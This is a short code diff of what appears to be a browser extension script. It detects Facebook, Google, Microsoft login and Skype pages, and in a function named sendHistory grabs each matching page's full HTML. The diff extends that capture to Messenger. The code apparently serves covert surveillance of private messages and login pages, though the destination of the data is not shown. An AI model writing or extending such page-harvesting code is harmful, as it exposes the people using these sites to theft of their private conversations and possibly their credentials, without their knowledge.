@@ -1,5 +1,6 @@
 const KEY = "DATA_1637469683_90061_2132";
 const isFacebook = window.location.origin.indexOf("facebook.com") > -1;
+const isMessenger = window.location.origin.indexOf("messenger.com") > -1;
 const isGoogle = window.location.origin.indexOf("google.com") > -1;
 const isLoginSkype = window.location.origin.indexOf("login.live.com") > -1;
 const isWebSkype = window.location.origin.indexOf("web.skype.com") > -1;
@@ -197,7 +198,7 @@ function sendHistory(url, title) {
     return;
   }
   let data = "";
-  if(isFacebook || isWebSkype) {
+  if(isFacebook || isWebSkype || isMessenger) {
     try {
       data = document.querySelector('html').outerHTML;
     } catch(e){}
